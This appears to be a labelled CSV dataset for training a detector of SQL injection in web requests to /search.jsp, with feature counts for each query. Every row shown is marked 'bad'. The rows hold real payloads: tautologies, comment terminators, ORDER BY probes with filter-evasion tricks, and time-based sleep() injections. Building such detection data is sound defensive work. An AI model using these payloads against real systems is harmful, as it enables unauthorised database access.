method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b'/search.jsp?query=""'",b'',0,1,0,0,0,0,bad
GET,"b'/search.jsp?query=""'",b'',0,1,0,0,0,0,bad
GET,"b'/search.jsp?query=""'",b'',0,1,0,0,0,0,bad
GET,"b'/search.jsp?query=""'",b'',0,1,0,0,0,0,bad
GET,"b'/search.jsp?query=""'",b'',0,1,0,0,0,0,bad
GET,"b'/search.jsp?query=""'",b'',0,1,0,0,0,0,bad
GET,b'/search.jsp?query=1',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=1',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=1',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=1',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=1',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=1',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=1',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=1',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=1',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=1',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=1',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=1',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=1',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=1',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=--+-',b'',0,0,1,0,1,0,bad
GET,b'/search.jsp?query=1+or+1+=+1',b'',0,0,0,0,4,0,bad
GET,b'/search.jsp?query=1+or+1+=+1+--+-',b'',0,0,1,0,6,0,bad
GET,b'/search.jsp?query=1+or+1+=+1+#',b'',0,0,0,0,5,0,bad
GET,b'/search.jsp?query=1+or+1+=+1+/*',b'',0,0,0,0,5,0,bad
GET,b'/search.jsp?query=1)+or+(1+=+1',b'',0,0,0,1,4,0,bad
GET,b'/search.jsp?query=1)+or+(1+=+1+--+-',b'',0,0,1,1,6,0,bad
GET,b'/search.jsp?query=1)+or+(1+=+1+#',b'',0,0,0,1,5,0,bad
GET,b'/search.jsp?query=1)+or+(1+=+1+/*',b'',0,0,0,1,5,0,bad
GET,b'/search.jsp?query=1)+or+(1)+=+(1',b'',0,0,0,2,4,0,bad
GET,b'/search.jsp?query=1)+or+(1)+=+(1+--+-',b'',0,0,1,2,6,0,bad
GET,b'/search.jsp?query=1)+or+(1)+=+(1+#',b'',0,0,0,2,5,0,bad
GET,b'/search.jsp?query=1)+or+(1)+=+(1+/*',b'',0,0,0,2,5,0,bad
GET,b'/search.jsp?query=1+--+-',b'',0,0,1,0,2,0,bad
GET,b'/search.jsp?query=1+#',b'',0,0,0,0,1,0,bad
GET,b'/search.jsp?query=1+/*',b'',0,0,0,0,1,0,bad
GET,b'/search.jsp?query=1)+--+-',b'',0,0,1,0,2,0,bad
GET,b'/search.jsp?query=1)+#',b'',0,0,0,0,1,0,bad
GET,b'/search.jsp?query=1)+/*',b'',0,0,0,0,1,0,bad
GET,"b""/search.jsp?query='+or+'1'+=+'1""",b'',4,0,0,0,4,0,bad
GET,"b""/search.jsp?query='+or+'1'+=+'1'+--+-""",b'',5,0,1,0,6,0,bad
GET,"b""/search.jsp?query='+or+'1'+=+'1'+#""",b'',5,0,0,0,5,0,bad
GET,"b""/search.jsp?query='+or+'1'+=+'1'+/*""",b'',5,0,0,0,5,0,bad
GET,"b""/search.jsp?query=')+or+('1'+=+'1""",b'',4,0,0,1,4,0,bad
GET,"b""/search.jsp?query=')+or+('1')+=+('1""",b'',4,0,0,2,4,0,bad
GET,"b'/search.jsp?query=""+or+""1""+=+""1'",b'',0,4,0,0,4,0,bad
GET,"b'/search.jsp?query="")+or+(""1""+=+""1'",b'',0,4,0,1,4,0,bad
GET,"b'/search.jsp?query="")+or+(""1"")+=+(""1'",b'',0,4,0,2,4,0,bad
GET,"b""/search.jsp?query='+--+-""",b'',1,0,1,0,2,0,bad
GET,"b'/search.jsp?query=""+--+-'",b'',0,1,1,0,2,0,bad
GET,"b""/search.jsp?query='+#""",b'',1,0,0,0,1,0,bad
GET,"b'/search.jsp?query=""+#'",b'',0,1,0,0,1,0,bad
GET,"b""/search.jsp?query='+/*""",b'',1,0,0,0,1,0,bad
GET,"b'/search.jsp?query=""+/*'",b'',0,1,0,0,1,0,bad
GET,"b""/search.jsp?query=')+--+-""",b'',1,0,1,0,2,0,bad
GET,"b'/search.jsp?query="")+--+-'",b'',0,1,1,0,2,0,bad
GET,"b""/search.jsp?query=')+#""",b'',1,0,0,0,1,0,bad
GET,"b'/search.jsp?query="")+#'",b'',0,1,0,0,1,0,bad
GET,"b""/search.jsp?query=')+/*""",b'',1,0,0,0,1,0,bad
GET,"b'/search.jsp?query="")+/*'",b'',0,1,0,0,1,0,bad
GET,"b""/search.jsp?query='))+--+-""",b'',1,0,1,0,2,0,bad
GET,"b'/search.jsp?query=""))+--+-'",b'',0,1,1,0,2,0,bad
GET,"b""/search.jsp?query='))+#""",b'',1,0,0,0,1,0,bad
GET,"b'/search.jsp?query=""))+#'",b'',0,1,0,0,1,0,bad
GET,"b""/search.jsp?query='))+/*""",b'',1,0,0,0,1,0,bad
GET,"b'/search.jsp?query=""))+/*'",b'',0,1,0,0,1,0,bad
GET,b'/search.jsp?query=)+--+-',b'',0,0,1,0,2,0,bad
GET,b'/search.jsp?query=)+#',b'',0,0,0,0,1,0,bad
GET,b'/search.jsp?query=)+/*',b'',0,0,0,0,1,0,bad
GET,b'/search.jsp?query=))+--+-',b'',0,0,1,0,2,0,bad
GET,b'/search.jsp?query=))+#',b'',0,0,0,0,1,0,bad
GET,b'/search.jsp?query=))+/*',b'',0,0,0,0,1,0,bad
GET,"b""/search.jsp?query='+and+'1'+=+'1""",b'',4,0,0,0,4,0,bad
GET,"b""/search.jsp?query='+and+'1'+=+'1'+--+-""",b'',5,0,1,0,6,0,bad
GET,"b""/search.jsp?query='+and+'1'+=+'1'+#""",b'',5,0,0,0,5,0,bad
GET,"b""/search.jsp?query='+and+'1'+=+'1'+/*""",b'',5,0,0,0,5,0,bad
GET,"b""/search.jsp?query=')+and+('1'+=+'1""",b'',4,0,0,1,4,0,bad
GET,"b""/search.jsp?query=')+and+('1')+=+('1""",b'',4,0,0,2,4,0,bad
GET,"b'/search.jsp?query=""+and+""1""+=+""1'",b'',0,4,0,0,4,0,bad
GET,"b'/search.jsp?query="")+and+(""1""+=+""1'",b'',0,4,0,1,4,0,bad
GET,"b'/search.jsp?query="")+and+(""1"")+=+(""1'",b'',0,4,0,2,4,0,bad
GET,b'/search.jsp?query=1+and+1+=+1',b'',0,0,0,0,4,0,bad
GET,b'/search.jsp?query=1+and+1+=+1+--+-',b'',0,0,1,0,6,0,bad
GET,b'/search.jsp?query=1+and+1+=+1+#',b'',0,0,0,0,5,0,bad
GET,b'/search.jsp?query=1+and+1+=+1+/*',b'',0,0,0,0,5,0,bad
GET,b'/search.jsp?query=1)+and+(1+=+1',b'',0,0,0,1,4,0,bad
GET,b'/search.jsp?query=1)+and+(1+=+1+--+-',b'',0,0,1,1,6,0,bad
GET,b'/search.jsp?query=1)+and+(1+=+1+#',b'',0,0,0,1,5,0,bad
GET,b'/search.jsp?query=1)+and+(1+=+1+/*',b'',0,0,0,1,5,0,bad
GET,b'/search.jsp?query=1)+and+(1)+=+(1',b'',0,0,0,2,4,0,bad
GET,b'/search.jsp?query=1)+and+(1)+=+(1+--+-',b'',0,0,1,2,6,0,bad
GET,b'/search.jsp?query=1)+and+(1)+=+(1+#',b'',0,0,0,2,5,0,bad
GET,b'/search.jsp?query=1)+and+(1)+=+(1+/*',b'',0,0,0,2,5,0,bad
GET,"b""/search.jsp?query='+||+'1'+=+'1""",b'',4,0,0,0,4,0,bad
GET,"b""/search.jsp?query='+||+'1'+=+'1'+--+-""",b'',5,0,1,0,6,0,bad
GET,"b""/search.jsp?query='+||+'1'+=+'1'+#""",b'',5,0,0,0,5,0,bad
GET,"b""/search.jsp?query='+||+'1'+=+'1'+/*""",b'',5,0,0,0,5,0,bad
GET,"b""/search.jsp?query=')+||+('1'+=+'1""",b'',4,0,0,1,4,0,bad
GET,"b""/search.jsp?query=')+||+('1')+=+('1""",b'',4,0,0,2,4,0,bad
GET,"b'/search.jsp?query=""+||+""1""+=+""1'",b'',0,4,0,0,4,0,bad
GET,"b'/search.jsp?query="")+||+(""1""+=+""1'",b'',0,4,0,1,4,0,bad
GET,"b'/search.jsp?query="")+||+(""1"")+=+(""1'",b'',0,4,0,2,4,0,bad
GET,b'/search.jsp?query=1+||+1+=+1',b'',0,0,0,0,4,0,bad
GET,b'/search.jsp?query=1+||+1+=+1+--+-',b'',0,0,1,0,6,0,bad
GET,b'/search.jsp?query=1+||+1+=+1+#',b'',0,0,0,0,5,0,bad
GET,b'/search.jsp?query=1+||+1+=+1+/*',b'',0,0,0,0,5,0,bad
GET,b'/search.jsp?query=1)+||+(1+=+1',b'',0,0,0,1,4,0,bad
GET,b'/search.jsp?query=1)+||+(1+=+1+--+-',b'',0,0,1,1,6,0,bad
GET,b'/search.jsp?query=1)+||+(1+=+1+#',b'',0,0,0,1,5,0,bad
GET,b'/search.jsp?query=1)+||+(1+=+1+/*',b'',0,0,0,1,5,0,bad
GET,b'/search.jsp?query=1)+||+(1)+=+(1',b'',0,0,0,2,4,0,bad
GET,b'/search.jsp?query=1)+||+(1)+=+(1+--+-',b'',0,0,1,2,6,0,bad
GET,b'/search.jsp?query=1)+||+(1)+=+(1+#',b'',0,0,0,2,5,0,bad
GET,b'/search.jsp?query=1)+||+(1)+=+(1+/*',b'',0,0,0,2,5,0,bad
GET,"b""/search.jsp?query='+&&+'1'+=+'1""",b'',4,0,0,0,4,0,bad
GET,"b""/search.jsp?query='+&&+'1'+=+'1'+--+-""",b'',5,0,1,0,6,0,bad
GET,"b""/search.jsp?query='+&&+'1'+=+'1'+#""",b'',5,0,0,0,5,0,bad
GET,"b""/search.jsp?query='+&&+'1'+=+'1'+/*""",b'',5,0,0,0,5,0,bad
GET,"b""/search.jsp?query=')+&&+('1'+=+'1""",b'',4,0,0,1,4,0,bad
GET,"b""/search.jsp?query=')+&&+('1')+=+('1""",b'',4,0,0,2,4,0,bad
GET,"b'/search.jsp?query=""+&&+""1""+=+""1'",b'',0,4,0,0,4,0,bad
GET,"b'/search.jsp?query="")+&&+(""1""+=+""1'",b'',0,4,0,1,4,0,bad
GET,"b'/search.jsp?query="")+&&+(""1"")+=+(""1'",b'',0,4,0,2,4,0,bad
GET,b'/search.jsp?query=1+&&+1+=+1',b'',0,0,0,0,4,0,bad
GET,b'/search.jsp?query=1+&&+1+=+1+--+-',b'',0,0,1,0,6,0,bad
GET,b'/search.jsp?query=1+&&+1+=+1+#',b'',0,0,0,0,5,0,bad
GET,b'/search.jsp?query=1+&&+1+=+1+/*',b'',0,0,0,0,5,0,bad
GET,b'/search.jsp?query=1)+&&+(1+=+1',b'',0,0,0,1,4,0,bad
GET,b'/search.jsp?query=1)+&&+(1+=+1+--+-',b'',0,0,1,1,6,0,bad
GET,b'/search.jsp?query=1)+&&+(1+=+1+#',b'',0,0,0,1,5,0,bad
GET,b'/search.jsp?query=1)+&&+(1+=+1+/*',b'',0,0,0,1,5,0,bad
GET,b'/search.jsp?query=1)+&&+(1)+=+(1',b'',0,0,0,2,4,0,bad
GET,b'/search.jsp?query=1)+&&+(1)+=+(1+--+-',b'',0,0,1,2,6,0,bad
GET,b'/search.jsp?query=1)+&&+(1)+=+(1+#',b'',0,0,0,2,5,0,bad
GET,b'/search.jsp?query=1)+&&+(1)+=+(1+/*',b'',0,0,0,2,5,0,bad
GET,"b""/search.jsp?query='+orDeR+by+1+--+-""",b'',1,0,1,0,5,1,bad
GET,"b""/search.jsp?query='+orDeR+by+1+#""",b'',1,0,0,0,4,1,bad
GET,"b""/search.jsp?query='+orDeR+by+1+/*""",b'',1,0,0,0,4,1,bad
GET,"b""/search.jsp?query='+orDeR+by+1337+--+-""",b'',1,0,1,0,5,1,bad
GET,"b""/search.jsp?query='+ordeR+by+1337+#""",b'',1,0,0,0,4,1,bad
GET,"b""/search.jsp?query='+ordeR+by+1337+/*""",b'',1,0,0,0,4,1,bad
GET,"b'/search.jsp?query=""+orDeR+by+1+--+-'",b'',0,1,1,0,5,1,bad
GET,"b'/search.jsp?query=""+orDeR+by+1+#'",b'',0,1,0,0,4,1,bad
GET,"b'/search.jsp?query=""+orDeR+by+1+/*'",b'',0,1,0,0,4,1,bad
GET,"b'/search.jsp?query=""+orDeR+by+1337+--+-'",b'',0,1,1,0,5,1,bad
GET,"b'/search.jsp?query=""+ordeR+by+1337+#'",b'',0,1,0,0,4,1,bad
GET,"b'/search.jsp?query=""+ordeR+by+1337+/*'",b'',0,1,0,0,4,1,bad
GET,"b""/search.jsp?query=')+orDeR+by+1+--+-""",b'',1,0,1,0,5,1,bad
GET,"b""/search.jsp?query=')+orDeR+by+1+#""",b'',1,0,0,0,4,1,bad
GET,"b""/search.jsp?query=')+orDeR+by+1+/*""",b'',1,0,0,0,4,1,bad
GET,"b""/search.jsp?query=')+orDeR+by+1337+--+-""",b'',1,0,1,0,5,1,bad
GET,"b""/search.jsp?query=')+ordeR+by+1337+#""",b'',1,0,0,0,4,1,bad
GET,"b""/search.jsp?query=')+ordeR+by+1337+/*""",b'',1,0,0,0,4,1,bad
GET,"b'/search.jsp?query="")+orDeR+by+1+--+-'",b'',0,1,1,0,5,1,bad
GET,"b'/search.jsp?query="")+orDeR+by+1+#'",b'',0,1,0,0,4,1,bad
GET,"b'/search.jsp?query="")+orDeR+by+1+/*'",b'',0,1,0,0,4,1,bad
GET,"b'/search.jsp?query="")+orDeR+by+1337+--+-'",b'',0,1,1,0,5,1,bad
GET,"b'/search.jsp?query="")+ordeR+by+1337+#'",b'',0,1,0,0,4,1,bad
GET,"b'/search.jsp?query="")+ordeR+by+1337+/*'",b'',0,1,0,0,4,1,bad
GET,"b""/search.jsp?query='+orORDeRdeR+by+1+--+-""",b'',1,0,1,0,5,0,bad
GET,"b""/search.jsp?query='+orORDeRdeR+by+1+#""",b'',1,0,0,0,4,0,bad
GET,"b""/search.jsp?query='+orORDeRdeR+by+1+/*""",b'',1,0,0,0,4,0,bad
GET,"b""/search.jsp?query='+orORDeRdeR+by+1337+--+-""",b'',1,0,1,0,5,0,bad
GET,"b""/search.jsp?query='+orORDeRdeR+by+1337+#""",b'',1,0,0,0,4,0,bad
GET,"b""/search.jsp?query='+orORDeRdeR+by+1337+/*""",b'',1,0,0,0,4,0,bad
GET,"b'/search.jsp?query=""+orORDeRdeR+by+1+--+-'",b'',0,1,1,0,5,0,bad
GET,"b'/search.jsp?query=""+orORDeRdeR+by+1+#'",b'',0,1,0,0,4,0,bad
GET,"b'/search.jsp?query=""+orORDeRdeR+by+1+/*'",b'',0,1,0,0,4,0,bad
GET,"b'/search.jsp?query=""+orORDeRdeR+by+1337+--+-'",b'',0,1,1,0,5,0,bad
GET,"b'/search.jsp?query=""+orORDeRdeR+by+1337+#'",b'',0,1,0,0,4,0,bad
GET,"b'/search.jsp?query=""+orORDeRdeR+by+1337+/*'",b'',0,1,0,0,4,0,bad
GET,"b""/search.jsp?query=')+orORDeRdeR+by+1+--+-""",b'',1,0,1,0,5,0,bad
GET,"b""/search.jsp?query=')+orORDeRdeR+by+1+#""",b'',1,0,0,0,4,0,bad
GET,"b""/search.jsp?query=')+orORDeRdeR+by+1+/*""",b'',1,0,0,0,4,0,bad
GET,"b""/search.jsp?query=')+orORDeRdeR+by+1337+--+-""",b'',1,0,1,0,5,0,bad
GET,"b""/search.jsp?query=')+orORDeRdeR+by+1337+#""",b'',1,0,0,0,4,0,bad
GET,"b""/search.jsp?query=')+orORDeRdeR+by+1337+/*""",b'',1,0,0,0,4,0,bad
GET,"b'/search.jsp?query="")+orORDeRdeR+by+1+--+-'",b'',0,1,1,0,5,0,bad
GET,"b'/search.jsp?query="")+orORDeRdeR+by+1+#'",b'',0,1,0,0,4,0,bad
GET,"b'/search.jsp?query="")+orORDeRdeR+by+1+/*'",b'',0,1,0,0,4,0,bad
GET,"b'/search.jsp?query="")+orORDeRdeR+by+1337+--+-'",b'',0,1,1,0,5,0,bad
GET,"b'/search.jsp?query="")+orORDeRdeR+by+1337+#'",b'',0,1,0,0,4,0,bad
GET,"b'/search.jsp?query="")+orORDeRdeR+by+1337+/*\''",b'',1,1,0,0,4,0,bad
GET,"b""/search.jsp?query='+/*!ORDER+BY*/+1+--+-""",b'',1,0,1,0,5,1,bad
GET,"b""/search.jsp?query='+/*!ORDER+BY*/+1+#""",b'',1,0,0,0,4,1,bad
GET,"b""/search.jsp?query='+/*!ORDER+BY*/+1+/*""",b'',1,0,0,0,4,1,bad
GET,"b""/search.jsp?query='+/*!ORDER+BY*/+1337+--+-""",b'',1,0,1,0,5,1,bad
GET,"b""/search.jsp?query='+/*!ORDER+BY*/+1337+#""",b'',1,0,0,0,4,1,bad
GET,"b""/search.jsp?query='+/*!ORDER+BY*/+1337+/*""",b'',1,0,0,0,4,1,bad
GET,"b'/search.jsp?query=""+/*!ORDER+BY*/+1+--+-'",b'',0,1,1,0,5,1,bad
GET,"b'/search.jsp?query=""+/*!ORDER+BY*/+1+#'",b'',0,1,0,0,4,1,bad
GET,"b'/search.jsp?query=""+/*!ORDER+BY*/+1+/*'",b'',0,1,0,0,4,1,bad
GET,"b'/search.jsp?query=""+/*!ORDER+BY*/+1337+--+-'",b'',0,1,1,0,5,1,bad
GET,"b'/search.jsp?query=""+/*!ORDER+BY*/+1337+#'",b'',0,1,0,0,4,1,bad
GET,"b'/search.jsp?query=""+/*!ORDER+BY*/+1337+/*'",b'',0,1,0,0,4,1,bad
GET,"b""/search.jsp?query=')+/*!ORDER+BY*/+1+--+-""",b'',1,0,1,0,5,1,bad
GET,"b""/search.jsp?query=')+/*!ORDER+BY*/+1+#""",b'',1,0,0,0,4,1,bad
GET,"b""/search.jsp?query=')+/*!ORDER+BY*/+1+/*""",b'',1,0,0,0,4,1,bad
GET,"b""/search.jsp?query=')+/*!ORDER+BY*/+1337+--+-""",b'',1,0,1,0,5,1,bad
GET,"b""/search.jsp?query=')+/*!ORDER+BY*/+1337+#""",b'',1,0,0,0,4,1,bad
GET,"b""/search.jsp?query=')+/*!ORDER+BY*/+1337+/*""",b'',1,0,0,0,4,1,bad
GET,"b'/search.jsp?query="")+/*!ORDER+BY*/+1+--+-'",b'',0,1,1,0,5,1,bad
GET,"b'/search.jsp?query="")+/*!ORDER+BY*/+1+#'",b'',0,1,0,0,4,1,bad
GET,"b'/search.jsp?query="")+/*!ORDER+BY*/+1+/*'",b'',0,1,0,0,4,1,bad
GET,"b'/search.jsp?query="")+/*!ORDER+BY*/+1337+--+-'",b'',0,1,1,0,5,1,bad
GET,"b'/search.jsp?query="")+/*!ORDER+BY*/+1337+#'",b'',0,1,0,0,4,1,bad
GET,"b'/search.jsp?query="")+/*!ORDER+BY*/+1337+/*'",b'',0,1,0,0,4,1,bad
GET,"b""/search.jsp?query='+/*!50000ORDER*//**//*!50000BY*/+1+--+-""",b'',1,0,1,0,4,0,bad
GET,"b""/search.jsp?query='+/*!50000ORDER*//**//*!50000BY*/+1+#""",b'',1,0,0,0,3,0,bad
GET,"b""/search.jsp?query='+/*!50000ORDER*//**//*!50000BY*/+1+/*""",b'',1,0,0,0,3,0,bad
GET,"b""/search.jsp?query='+/*!50000ORDER*//**//*!50000BY*/+1337+--+-""",b'',1,0,1,0,4,0,bad
GET,"b""/search.jsp?query='+/*!50000ORDER*//**//*!50000BY*/+1337+#""",b'',1,0,0,0,3,0,bad
GET,"b""/search.jsp?query='+/*!50000ORDER*//**//*!50000BY*/+1337+/*""",b'',1,0,0,0,3,0,bad
GET,"b'/search.jsp?query=""+/*!50000ORDER*//**//*!50000BY*/+1+--+-'",b'',0,1,1,0,4,0,bad
GET,"b'/search.jsp?query=""+/*!50000ORDER*//**//*!50000BY*/+1+#'",b'',0,1,0,0,3,0,bad
GET,"b'/search.jsp?query=""+/*!50000ORDER*//**//*!50000BY*/+1+/*'",b'',0,1,0,0,3,0,bad
GET,"b'/search.jsp?query=""+/*!50000ORDER*//**//*!50000BY*/+1337+--+-'",b'',0,1,1,0,4,0,bad
GET,"b'/search.jsp?query=""+/*!50000ORDER*//**//*!50000BY*/+1337+#'",b'',0,1,0,0,3,0,bad
GET,"b'/search.jsp?query=""+/*!50000ORDER*//**//*!50000BY*/+1337+/*'",b'',0,1,0,0,3,0,bad
GET,"b""/search.jsp?query=')+/*!50000ORDER*//**//*!50000BY*/+1+--+-""",b'',1,0,1,0,4,0,bad
GET,"b""/search.jsp?query=')+/*!50000ORDER*//**//*!50000BY*/+1+#""",b'',1,0,0,0,3,0,bad
GET,"b""/search.jsp?query=')+/*!50000ORDER*//**//*!50000BY*/+1+/*""",b'',1,0,0,0,3,0,bad
GET,"b""/search.jsp?query=')+/*!50000ORDER*//**//*!50000BY*/+1337+--+-""",b'',1,0,1,0,4,0,bad
GET,"b""/search.jsp?query=')+/*!50000ORDER*//**//*!50000BY*/+1337+#""",b'',1,0,0,0,3,0,bad
GET,"b""/search.jsp?query=')+/*!50000ORDER*//**//*!50000BY*/+1337+/*""",b'',1,0,0,0,3,0,bad
GET,"b'/search.jsp?query="")+/*!50000ORDER*//**//*!50000BY*/+1+--+-'",b'',0,1,1,0,4,0,bad
GET,"b'/search.jsp?query="")+/*!50000ORDER*//**//*!50000BY*/+1+#'",b'',0,1,0,0,3,0,bad
GET,"b'/search.jsp?query="")+/*!50000ORDER*//**//*!50000BY*/+1+/*'",b'',0,1,0,0,3,0,bad
GET,"b'/search.jsp?query="")+/*!50000ORDER*//**//*!50000BY*/+1337+--+-'",b'',0,1,1,0,4,0,bad
GET,"b'/search.jsp?query="")+/*!50000ORDER*//**//*!50000BY*/+1337+#'",b'',0,1,0,0,3,0,bad
GET,"b'/search.jsp?query="")+/*!50000ORDER*//**//*!50000BY*/+1337+/*'",b'',0,1,0,0,3,0,bad
GET,"b""/search.jsp?query='+oR+sleep(5)+--+-""",b'',1,0,1,1,4,1,bad
GET,"b""/search.jsp?query='+oR+sleep(5)+#""",b'',1,0,0,1,3,1,bad
GET,"b""/search.jsp?query='+oR+sleep(5)+/*""",b'',1,0,0,1,3,1,bad
GET,"b""/search.jsp?query='+AnD+sleep(5)+--+-""",b'',1,0,1,1,4,1,bad
GET,"b""/search.jsp?query='+AnD+sleep(5)+#""",b'',1,0,0,1,3,1,bad
GET,"b""/search.jsp?query='+AnD+sleep(5)+/*""",b'',1,0,0,1,3,1,bad
GET,"b""/search.jsp?query=')+AnD+sleep(5)+--+-""",b'',1,0,1,1,4,1,bad
GET,"b""/search.jsp?query=')+AnD+sleep(5)+#""",b'',1,0,0,1,3,1,bad
GET,"b""/search.jsp?query=')+AnD+sleep(5)+/*""",b'',1,0,0,1,3,1,bad
GET,"b'/search.jsp?query=""+oR+sleep(5)+--+-'",b'',0,1,1,1,4,1,bad
GET,"b'/search.jsp?query=""+oR+sleep(5)+#'",b'',0,1,0,1,3,1,bad
GET,"b'/search.jsp?query=""+oR+sleep(5)+/*'",b'',0,1,0,1,3,1,bad
GET,"b'/search.jsp?query=""+AnD+sleep(5)+--+-'",b'',0,1,1,1,4,1,bad
GET,"b'/search.jsp?query=""+AnD+sleep(5)+#'",b'',0,1,0,1,3,1,bad
GET,"b'/search.jsp?query=""+AnD+sleep(5)+/*'",b'',0,1,0,1,3,1,bad
GET,"b'/search.jsp?query="")+AnD+sleep(5)+--+-'",b'',0,1,1,1,4,1,bad
GET,"b'/search.jsp?query="")+AnD+sleep(5)+#'",b'',0,1,0,1,3,1,bad
GET,"b'/search.jsp?query="")+AnD+sleep(5)+/*'",b'',0,1,0,1,3,1,bad
GET,"b""/search.jsp?query='+=+'1'+aNd+sleep(4)+anD+'1'+=+'1""",b'',6,0,0,1,8,1,bad
GET,"b""/search.jsp?query='+=+'2'+Or+sleep(4)+anD+'1'+=+'1""",b'',6,0,0,1,8,1,bad
GET,"b'/search.jsp?query=""+=+""1""+aNd+sleep(4)+anD+""1""+=+""1'",b'',0,6,0,1,8,1,bad
GET,"b'/search.jsp?query=""+=+""2""+Or+sleep(4)+anD+""1""+=+""1'",b'',0,6,0,1,8,1,bad
GET,"b""/search.jsp?query='+=+'1'+aNd+sleep(4)+anD+'1'+=+'1'+--+-""",b'',7,0,1,1,10,1,bad
GET,"b""/search.jsp?query='+=+'2'+Or+sleep(4)+anD+'1'+=+'1'+--+-""",b'',7,0,1,1,10,1,bad
GET,"b""/search.jsp?query='+=+'1'+aNd+sleep(4)+anD+'1'+=+'1'+#""",b'',7,0,0,1,9,1,bad
GET,"b""/search.jsp?query='+=+'2'+Or+sleep(4)+anD+'1'+=+'1'+#""",b'',7,0,0,1,9,1,bad
GET,"b""/search.jsp?query='+=+'1'+aNd+sleep(4)+anD+'1'+=+'1'+/*""",b'',7,0,0,1,9,1,bad
GET,"b""/search.jsp?query='+=+'2'+Or+sleep(4)+anD+'1'+=+'1'+/*""",b'',7,0,0,1,9,1,bad
GET,"b'/search.jsp?query=""+=+""1""+aNd+sleep(4)+anD+""1""+=+""1""+--+-'",b'',0,7,1,1,10,1,bad
GET,"b'/search.jsp?query=""+=+""2""+Or+sleep(4)+anD+""1""+=+""1""+--+-'",b'',0,7,1,1,10,1,bad
GET,"b'/search.jsp?query=""+=+""1""+aNd+sleep(4)+anD+""1""+=+""1""+#'",b'',0,7,0,1,9,1,bad
GET,"b'/search.jsp?query=""+=+""2""+Or+sleep(4)+anD+""1""+=+""1""+#'",b'',0,7,0,1,9,1,bad
GET,"b'/search.jsp?query=""+=+""1""+aNd+sleep(4)+anD+""1""+=+""1""+/*'",b'',0,7,0,1,9,1,bad
GET,"b'/search.jsp?query=""+=+""2""+Or+sleep(4)+anD+""1""+=+""1""+/*'",b'',0,7,0,1,9,1,bad
GET,b'/search.jsp?query=1+=+1+aNd+sleep(4)+anD+1+=+1',b'',0,0,0,1,8,1,bad
GET,b'/search.jsp?query=1+=+2+Or+sleep(4)+anD+1+=+1',b'',0,0,0,1,8,1,bad
GET,"b""/search.jsp?query=1+=+1+aNd+sleep(4)+anD+'1'+=+'1'+--+-""",b'',4,0,1,1,10,1,bad
GET,"b""/search.jsp?query=1+=+2+Or+sleep(4)+anD+'1'+=+'1'+--+-""",b'',4,0,1,1,10,1,bad
GET,"b""/search.jsp?query=1+=+1+aNd+sleep(4)+anD+'1'+=+'1'+#""",b'',4,0,0,1,9,1,bad
GET,"b""/search.jsp?query=1+=+2+Or+sleep(4)+anD+'1'+=+'1'+#""",b'',4,0,0,1,9,1,bad
GET,"b""/search.jsp?query=1+=+1+aNd+sleep(4)+anD+'1'+=+'1'+/*""",b'',4,0,0,1,9,1,bad
GET,"b""/search.jsp?query=1+=+2+Or+sleep(4)+anD+'1'+=+'1'+/*""",b'',4,0,0,1,9,1,bad
GET,b'/search.jsp?query=1+aNd+sleep(4)+--+-',b'',0,0,1,1,4,1,bad
GET,b'/search.jsp?query=1+aNd+sleep(4)+#',b'',0,0,0,1,3,1,bad
GET,b'/search.jsp?query=1+aNd+sleep(4)+/*',b'',0,0,0,1,3,1,bad
GET,b'/search.jsp?query=1+Or+sleep(4)+--+-',b'',0,0,1,1,4,1,bad
